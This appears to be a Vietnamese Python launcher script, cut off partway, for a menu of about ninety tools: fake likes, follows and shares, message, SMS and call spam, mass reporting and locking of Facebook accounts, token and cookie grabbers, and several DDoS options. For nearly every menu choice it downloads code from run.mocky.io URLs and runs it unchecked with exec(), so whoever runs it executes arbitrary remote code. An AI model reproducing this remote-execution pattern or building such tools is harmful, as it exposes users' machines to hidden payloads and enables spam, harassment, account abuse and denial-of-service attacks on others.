import os
try:
	import requests,colorama,prettytable
except:
	os.system("pip install requests")
	os.system("pip install colorama")
	os.system("pip install prettytable")
import threading, requests, ctypes, random, json, time, base64, sys, re
from prettytable import PrettyTable
import random
from time import strftime
from colorama import init, Fore
from urllib.parse import urlparse, unquote, quote
from string import ascii_letters, digits
import os,sys
import requests,json
from time import sleep
from datetime import datetime, timedelta
import base64,requests,os
#màu
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;37m"
whiteb="\033[1;37m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'
#đánh dấu bản quyền
ndp_tool="\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=>  "
thanh = "\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
#Config
__SHOP__ = 'KeoTuongTac.Com'
__ZALO__ = '0382771060'
__ADMIN__ = 'Hoang Duy'
__FACEBOOK__ = 'Shelby.user'
__VERSION__ = '1.0'
def banner():
 banner = f"""
\033[1;31m╔══════════════════════════════════════════════════════════════════════╗
\033[1;32m║ ███╗   ██╗██╗   ██╗██╗     ██╗             ██████╗ ███████╗██╗   ██╗ ║
\033[1;35m║ ████╗  ██║██║   ██║██║     ██║             ██╔══██╗██╔════╝██║   ██║ ║
\033[1;31m║ ██╔██╗ ██║██║   ██║██║     ██║     ██████╗ ██║  ██║███████╗╚██╗ ██╔╝ ║
\033[1;33m║ ██║╚██╗██║██║   ██║██║     ██║     ╚═════╝ ██║  ██║██╔════╝ ╚████╔╝  ║
\033[1;34m║ ██║ ╚████║╚██████╔╝███████╗███████╗        ██████╔╝███████╗  ╚██╔╝   ║
\033[1;37m║ ╚═╝  ╚═══╝  ╚════╝ ╚══════╝╚══════╝        ╚═════╝ ╚══════╝   ╚═╝    ║
\033[1;34m╠══════════════════════════════════════════════════════════════════════╣
\033[1;32m║➢ Author   : 🌺NullSOFT🌺                                             ║
\033[1;36m║➢ Youtube  : https://youtube.com/@_NullSOFT                           ║
\033[1;31m║➣ Support  : https://fb.com/HoangDuy.user                             ║
\033[1;33m║➣ Website Gạch Thẻ Cào  : https://NhantheNhanh.Com/                   ║
\033[1;34m╚══════════════════════════════════════════════════════════════════════╝
"""
 for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush() 
  sleep(0.00125)
# =======================[ NHẬP KEY ]=======================
os.system("cls" if os.name == "nt" else "clear")
banner()
import json,requests,time
from time import strftime
print("\033[0;35m╔════════════════════════╗")
print("\033[1;35m║ \033[1;33mTool Trao Đổi Sub      \033[0;35m║")
print("\033[1;35m╚════════════════════════╝")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m1\033[1;31m] \033[1;32mTool TDS Instagram")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m2\033[1;31m] \033[1;32mTool TDS Pro5")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m3\033[1;31m] \033[1;32mTool TDS Pro5 Đa Luồng")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m4\033[1;31m] \033[1;32mTool TDS TikTok")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m5\033[1;31m] \033[1;32mTool TDS TikTok + Tiktok Now")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m6\033[1;31m] \033[1;32mTool TDS Full Job")
print("\033[1;31m____________________________________________________________")
print("\033[0;35m╔════════════════════════╗")
print("\033[1;35m║\033[1;33mTool Tương Tác Chéo     \033[0;35m║")
print("\033[1;35m╚════════════════════════╝")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m7\033[1;31m] \033[1;32mTool TTC FB Thường\033[1;33m(Bảo Trì)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m8\033[1;31m] \033[1;32mTool TTC Pro5 v1")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m9\033[1;31m] \033[1;32mTool TTC Pro5 v2")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m10\033[1;31m] \033[1;32mTool TTC TikTok\033[1;33m(Bảo Trì)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m11\033[1;31m] \033[1;32mTool TTC Instagram Vipig")
print("\033[1;31m____________________________________________________________")
print("\033[0;35m╔════════════════════════╗")
print("\033[1;35m║  \033[1;33mTool Facebook         \033[0;35m║")
print("\033[1;35m╚════════════════════════╝")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m12\033[1;31m] \033[1;32mTool Buff Follow Bằng Pro5 ")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m13\033[1;31m] \033[1;32mTool Buff Like Bằng Pro5")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m14\033[1;31m] \033[1;32mTool Buff Cảm Xúc Bằng Pro5")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m15\033[1;31m] \033[1;32mTool Buff View Story Bằng Pro5")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m16\033[1;31m] \033[1;32mTool Buff Member Group Bằng Pro5 ")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m17\033[1;31m] \033[1;32mTool Buff Share Ảo")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m18\033[1;31m] \033[1;32mTool Buff Share Ảo Pro5 - Cookie\033[1;33m(Đa Luồng)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m19\033[1;31m] \033[1;32mTool Buff Share Ảo Pro5 - Token")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m20\033[1;31m] \033[1;32mTool Buff Share Ảo Pro5\033[1;33m(Max Speed)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m21\033[1;31m] \033[1;32mTool Reg Page Vị Trí ")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m22\033[1;31m] \033[1;32mTool Reg Page Pro5 + Up AVT")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m23\033[1;31m] \033[1;32mTool Kích Hoạt Pro5")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m24\033[1;31m] \033[1;32mTool Chuyển Page Vị Trí Về Pro5 + Up AVT")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m25\033[1;31m] \033[1;32mTool Tố Cáo Facebook")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m26\033[1;31m] \033[1;32mTool Làm Khoá Acc Facebook\033[1;33m(Bảo Trì)")
print("\033[1;31m____________________________________________________________")
print("\033[0;35m╔════════════════════════╗")
print("\033[1;35m║  \033[1;33mTool Message          \033[0;35m║")
print("\033[1;35m╚════════════════════════╝")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m27\033[1;31m] \033[1;32mĐếm Lần Yêu Hoặc Sủa")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m28\033[1;31m] \033[1;32mTool Spam Tin Nhắn\033[1;33m(Người Chỉ Định)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m29\033[1;31m] \033[1;32mTool Spam Box Mess\033[1;33m(Nội Dung Theo Ý Muốn)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m30\033[1;31m] \033[1;32mTool War Box Mess")
print("\033[1;31m____________________________________________________________")
print("\033[0;35m╔════════════════════════╗")
print("\033[1;35m║  \033[1;33mTiện Ích Facebook     \033[0;35m║")
print("\033[1;35m╚════════════════════════╝")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m31\033[1;31m] \033[1;32mTool Nuôi Facebook(Like, Join Group Dạo)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m32\033[1;31m] \033[1;32mTool Nuôi Facebook(Like, Add, Cmt Dạo)\033[1;33m(Bảo Trì)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m33\033[1;31m] \033[1;32mTool Buff Comment")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m34\033[1;31m] \033[1;32mTool Spam Comment Emoji")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m35\033[1;31m] \033[1;32mTool Spam Comment Bằng Pro5")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m36\033[1;31m] \033[1;32mTool Kết Bạn Facebook Gợi Ý")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m37\033[1;31m] \033[1;32mTool Check Liên Kết Facebook\033[1;33m(Bảo Trì) ")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m38\033[1;31m] \033[1;32mTool Get ID Facebook\033[1;33m(Bảo Trì)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m39\033[1;31m] \033[1;32mTag Tên Vào Tiểu Sử")
print("\033[1;31m____________________________________________________________")
print("\033[0;35m╔════════════════════════╗")
print("\033[1;35m\033[1;35m\033[1;35m║  \033[1;33mTool Telegram         \033[0;35m║")
print("\033[1;35m\033[1;35m\033[1;35m╚════════════════════════╝")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m40\033[1;31m] \033[1;32mBuff Member Telegram ")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m41\033[1;31m] \033[1;32mTool Spam Box Chat\033[1;33m(Bảo Trì) ")
print("\033[1;31m____________________________________________________________")
print("\033[0;35m╔════════════════════════╗")
print("\033[1;35m║  \033[1;33mTool TikTok           \033[0;35m║")
print("\033[1;35m╚════════════════════════╝")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m42\033[1;31m] \033[1;32mTool Buff View Zefoy ")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m43\033[1;31m] \033[1;32mTool Buff View Proxy")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m44\033[1;31m] \033[1;32mTool Buff Tym TikTok\033[1;33m(Bảo Trì)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m45\033[1;31m] \033[1;32mTool Buff Yêu Thích\033[1;33m(Bảo Trì)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m46\033[1;31m] \033[1;32mTool Buff Share Ảo TikTok\033[1;33m(Bảo Trì)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m47\033[1;31m] \033[1;32mTool Buff Comment TikTok\033[1;33m(Bảo Trì)")
print("\033[1;31m____________________________________________________________")
print("\033[0;35m╔════════════════════════╗")
print("\033[1;35m║  \033[1;33mĐào Bới               \033[0;35m║")
print("\033[1;35m╚════════════════════════╝")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m48\033[1;31m] \033[1;32mTool Đào Proxy\033[1;33m(Tạm Ổn)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m49\033[1;31m] \033[1;32mTool Đào Proxy 3 Chế Độ\033[1;33m(Pro)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m50\033[1;31m] \033[1;32mTool Lọc Proxy Ver1")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m51\033[1;31m] \033[1;32mTool Lọc Proxy\033[1;33m(Pro)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m52\033[1;31m] \033[1;32mTool Đào Mail ")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m53\033[1;31m] \033[1;32mTool Lọc Mail ")
print("\033[1;31m____________________________________________________________")
print("\033[0;35m╔════════════════════════╗")
print("\033[1;35m║  \033[1;33mTiện Ích Ver1         \033[0;35m║")
print("\033[1;35m╚════════════════════════╝")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m54\033[1;31m] \033[1;32mTool Reg Garena ")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m55\033[1;31m] \033[1;32mTool Bug Vượt Link \033[1;33m(Bảo Trì)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m56\033[1;31m] \033[1;32mTool Spam SMS")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m57\033[1;31m] \033[1;32mTool Spam SMS + Call Ver1")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m58\033[1;31m] \033[1;32mTool Spam SMS + Call Ver2")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m59\033[1;31m] \033[1;32mTool Tải Video Facebook")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m60\033[1;31m] \033[1;32mTool Tải Video Instagram")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m61\033[1;31m] \033[1;32mTool Tải Video Youtube")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m62\033[1;31m] \033[1;32mTool Tải Video Tiktok")
print("\033[1;31m____________________________________________________________")
print("\033[0;35m╔════════════════════════╗")
print("\033[1;35m║  \033[1;33mTiện Ích Ver2         \033[0;35m║")
print("\033[1;35m╚════════════════════════╝")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m63\033[1;31m] \033[1;32mChat GPT\033[1;33m(Bảo Trì)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m64\033[1;31m] \033[1;32mTool Get Token Pro5")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m65\033[1;31m] \033[1;32mTool Get Token Full Quyền")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m66\033[1;31m] \033[1;32mTool Get Cookie Pro5")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m67\033[1;31m] \033[1;32mToolĐang Update!!")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m68\033[1;31m] \033[1;32mToolĐang Update!!")
print("\033[1;31m____________________________________________________________")
print("\033[0;35m╔════════════════════════╗")
print("\033[1;35m║  \033[1;33mGiải Trí              \033[0;35m║")
print("\033[1;35m╚════════════════════════╝")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m69\033[1;31m] \033[1;32mTài Xỉu")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m70\033[1;31m] \033[1;32mRắn Săn Mồi")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m71\033[1;31m] \033[1;32mXếp Gạch")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m72\033[1;31m] \033[1;32mSpace Invader")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m73\033[1;31m] \033[1;32mPac-Man")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m74\033[1;31m] \033[1;32mSodoku\033[1;33m(Bảo Trì)")
print("\033[1;31m____________________________________________________________")
print("\033[0;35m╔════════════════════════╗")
print("\033[1;35m║  \033[1;33mEncode Và Decode      \033[0;35m║")
print("\033[1;35m╚════════════════════════╝")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m75\033[1;31m] \033[1;32mTool ENCODE Ver1")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m76\033[1;31m] \033[1;32mTool ENCODE - INPOSTOR\033[1;33m(Bảo Trì)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m77\033[1;31m] \033[1;32mTool ENCODE - 5 LỚP")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m78\033[1;31m] \033[1;32mTool ENCODE - MARSHAL 16 CHẾ ĐỘ")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m79\033[1;31m] \033[1;32mTool ENCODE - Emoji 4 Chế Độ")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m80\033[1;31m] \033[1;32mTool ENCODE - MARSHAL\033[1;33m(Bảo Trì)")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m81\033[1;31m] \033[1;32mTool DECCODE - MARSHAL")
print("\033[1;31m____________________________________________________________")
print("\033[0;35m╔════════════════════════╗")
print("\033[1;35m║  \033[1;33mCông Cụ Hữu Ích       \033[0;35m║")
print("\033[1;35m╚════════════════════════╝")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m82\033[1;31m] \033[1;32mMáy Tính")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m83\033[1;31m] \033[1;32mSetup DDOS")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m84\033[1;31m] \033[1;32mDDOS Ver1")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m85\033[1;31m] \033[1;32mDDOS Ver2")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m86\033[1;31m] \033[1;32mDDOS Ver3\033[1;33m(Bảo Trì)")
print("\033[1;31m____________________________________________________________")
print("\033[0;35m╔════════════════════════╗")
print("\033[1;35m║  \033[1;33mCác Tool Crack Khác   \033[0;35m║")
print("\033[1;35m╚════════════════════════╝")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m87\033[1;31m] \033[1;32mTool Gộp Anorin")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m88\033[1;31m] \033[1;32mTool Gộp HDT Tool")
print("\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m89\033[1;31m] \033[1;32mTool Gộp Nhiều Chức Năng By Phong")
print("\033[1;31m____________________________________________________________")

chon = int(input('\033[1;31m[\033[1;37m>🍓<\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;37m: \033[1;33m'))
if chon == 1 :
	exec(requests.get('https://run.mocky.io/v3/0b053b6f-2581-4a0b-a5b1-a36ffc476355').text)
if chon == 2 :
	exec(requests.get('https://run.mocky.io/v3/254615ca-b04d-4f92-b41a-3813f9ccbc99').text)
if chon == 3 :
	exec(requests.get('https://run.mocky.io/v3/55f110ad-4ac5-419d-b25a-4ed4d52e7e5e').text)
if chon == 4 :
	exec(requests.get('https://run.mocky.io/v3/c27f039d-8308-41df-80e2-5cbecfb53621').text)
if chon == 5 :
	exec(requests.get('https://run.mocky.io/v3/c27f039d-8308-41df-80e2-5cbecfb53621').text)
if chon == 6 :
	exec(requests.get('https://run.mocky.io/v3/54c8ff9a-0257-4ab0-9c8b-8591af35cf96').text)
if chon == 7:
	exec(requests.get('').text)
if chon == 8 :
	exec(requests.get('https://run.mocky.io/v3/155f5516-c50f-4ffe-8cc5-3c5d3c7addf8').text)
if chon == 9 :
	exec(requests.get('https://run.mocky.io/v3/9e57aa2d-c513-4412-a9d8-0a84de3a3aed').text)
if chon == 10 :
	exec(requests.get('').text)
if chon == 11 :
	exec(requests.get('https://run.mocky.io/v3/88a119f0-8879-48d7-b611-4c40857fc262').text)
if chon == 12 :
	exec(requests.get('https://run.mocky.io/v3/b7d2e74e-2229-43c6-b3dc-5485200054b1').text)
if chon == 13 :
	exec(requests.get('https://run.mocky.io/v3/84df244e-a25c-4261-b5be-b999b0e89865').text)
if chon == 14 :
	exec(requests.get('https://run.mocky.io/v3/84df244e-a25c-4261-b5be-b999b0e89865').text)
if chon == 15 :
	exec(requests.get('https://run.mocky.io/v3/9dcd1791-2442-4632-a30a-f13b4b78e8ff').text)
if chon == 16 :
	exec(requests.get('https://run.mocky.io/v3/c17cc41d-1a6d-4261-b659-3068872961f1').text)
if chon == 17 :
	exec(requests.get('https://run.mocky.io/v3/674d4497-8537-461e-a5e1-190808dc6c1c').text)
if chon == 18 :
	exec(requests.get('https://run.mocky.io/v3/9c1f7e63-f2c0-4e71-a4e6-bc5d462915ef').text)
if chon == 19 :
	exec(requests.get('https://run.mocky.io/v3/03c1c4ae-1adb-439b-bbff-d7acd5044b6f').text)
if chon == 20 :
	exec(requests.get('https://run.mocky.io/v3/bca5dd52-e2bb-4db7-9231-6b617f71312a').text)
if chon == 21 :
	exec(requests.get('https://run.mocky.io/v3/83aa4569-567c-44e6-ae84-ebe59b855a6e').text)
if chon == 22 :
	exec(requests.get('https://run.mocky.io/v3/9837245d-ccbc-47f8-b76c-6b2630bebebe').text)
if chon == 23 :
	exec(requests.get('https://run.mocky.io/v3/39f17e5b-8ba1-43e1-a892-7045e6f5d6f7').text)
if chon == 24 :
	exec(requests.get('https://run.mocky.io/v3/8afa6f02-c9b8-45c7-b589-72d3af9a2fe8').text)
if chon == 25 :
	exec(requests.get('https://run.mocky.io/v3/10b36763-9111-49ff-a585-0e65208cfe0f').text)
if chon == 26 :
	exec(requests.get('').text)
if chon == 27 :
	exec(requests.get('https://run.mocky.io/v3/d8ca6a2d-6e96-445a-bd62-ca3aada18056').text)
if chon == 28 :
	exec(requests.get('https://run.mocky.io/v3/d8b0f965-1757-48e3-a666-a756fb6b8b5f').text)
if chon == 29 :
	exec(requests.get('https://run.mocky.io/v3/c1f43cbe-adcf-48db-9bb2-95f8ab1cb9ba').text)
if chon == 30:
	exec(requests.get('https://run.mocky.io/v3/d54f637b-af20-4a6c-a298-454290926e81').text)
if chon == 31 :
	exec(requests.get('https://run.mocky.io/v3/68499e00-17d9-4a51-aa54-f4816d6c7348').text)
if chon == 32 :
	exec(requests.get('https://run.mocky.io/v3/d8a4be3c-a1e5-450b-9266-7ce7d1d91167').text)
if chon == 33 :
	exec(requests.get('https://run.mocky.io/v3/078e7430-fa77-4548-af25-f44440a6b347').text)
if chon == 34 :
	exec(requests.get('https://run.mocky.io/v3/62f2a178-23d7-42ef-a0ba-aca08014c242').text)
if chon == 35 :
	exec(requests.get('https://run.mocky.io/v3/39130ac2-968d-4704-9e1a-bb2cbad4edbf').text)
if chon == 36 :
	exec(requests.get('https://run.mocky.io/v3/e259c235-a8bb-477d-8e7f-c98daccbb814').text)
if chon == 37 :
	exec(requests.get('').text)
if chon == 38 :
	exec(requests.get('').text)
if chon == 39 :
	exec(requests.get('https://run.mocky.io/v3/313afd2d-a592-4c5a-bea4-340b33772049').text)
if chon == 40 :
	exec(requests.get('https://run.mocky.io/v3/f9d450bb-f1c6-493e-a208-2fbdbb4d0e3b').text)
if chon == 41 :
	exec(requests.get('').text)
if chon == 42 :
	exec(requests.get('https://run.mocky.io/v3/6ee2b12c-5136-4492-b2f1-2967e6c687a0').text)
if chon == 43 :
	exec(requests.get('https://run.mocky.io/v3/74eeaf53-0f8e-4b19-8ca3-4321decd46db').text)
if chon == 44 :
	exec(requests.get('').text)
if chon == 45 :
	exec(requests.get('').text)
if chon == 46:
	exec(requests.get('').text)
if chon == 47 :
	exec(requests.get('').text)
if chon == 48 :
	exec(requests.get('https://run.mocky.io/v3/9f8a27ee-ba34-44e5-9569-536d8cef5b4b').text)
if chon == 49 :
	exec(requests.get('https://run.mocky.io/v3/885bd865-f4c7-4cfc-9d73-ac8e748bd6ed').text)
if chon == 50 :
	exec(requests.get('https://run.mocky.io/v3/bcac62e0-b122-4b16-92b9-dd70f3c36010').text)
if chon == 51 :
	exec(requests.get('https://run.mocky.io/v3/d481bd19-e507-4f11-a612-c281d6b01eec').text)
if chon == 52 :
	exec(requests.get('https://run.mocky.io/v3/2c8cfa12-5ac4-40eb-936b-1ea6cd809939').text)
if chon == 53 :
	exec(requests.get('https://run.mocky.io/v3/6c858225-0d88-4d4c-b357-c71b593a736b').text)
if chon == 54 :
	exec(requests.get('https://run.mocky.io/v3/d0c4866c-9327-4a0d-a313-16a4c6000675').text)
if chon == 55 :
	exec(requests.get('').text)
if chon == 56 :
	exec(requests.get('').text)
if chon == 57 :
	exec(requests.get('https://run.mocky.io/v3/71df1486-9cb2-4fa9-a667-46df3b6f429c').text)
if chon == 58 :
	exec(requests.get('https://run.mocky.io/v3/d387ebf9-530e-484d-a1ca-4db6356e1ad4').text)
if chon == 59 :
	exec(requests.get('https://run.mocky.io/v3/d3a0c6e1-32ca-4f37-bea8-e6c47e6c4616').text)
if chon == 60 :
	exec(requests.get('https://run.mocky.io/v3/d3a0c6e1-32ca-4f37-bea8-e6c47e6c4616').text)
if chon == 61 :
